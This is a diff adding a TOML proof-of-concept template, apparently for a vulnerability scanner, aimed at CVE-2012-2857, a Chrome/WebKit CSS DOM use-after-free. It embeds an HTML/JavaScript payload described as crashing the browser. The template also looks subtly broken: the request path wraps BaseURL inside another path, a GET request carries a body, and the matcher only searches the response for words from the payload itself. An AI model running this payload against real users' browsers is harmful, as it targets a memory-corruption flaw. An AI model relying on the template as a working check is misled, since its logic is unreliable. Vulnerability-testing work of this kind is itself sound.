@@ -1,0 +1,46 @@
+[info]
+author = "AVE"
+description = "通过构造包含特定 CSS 样式操作的 HTML 页面，触发 Google Chrome/WebKit CSS DOM 释放后重用漏洞，导致浏览器崩溃。"
+id = "POC-AVE-2012-0258"
+name = "CVE-2012-2857 PoC"
+severity = "medium"
+tags = [
+    "cve-2012-2857",
+    "use-after-free",
+    "chrome",
+    "webkit",
+]
+vuln_id = [
+    "CVE-2012-2857",
+    "AVE-2012-0258",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/poc.html"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<html><body><script>
+var e = document.createElement('div');
+e.style.cssText = 'color: red';
+document.body.appendChild(e);
+e.outerHTML = '<span style="color: blue"></span>';
+var s = document.querySelectorAll('span');
+s[0].style.color = 'green';
+</script></body></html>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "createElement",
+    "querySelectorAll",
+    "outerHTML",
+]
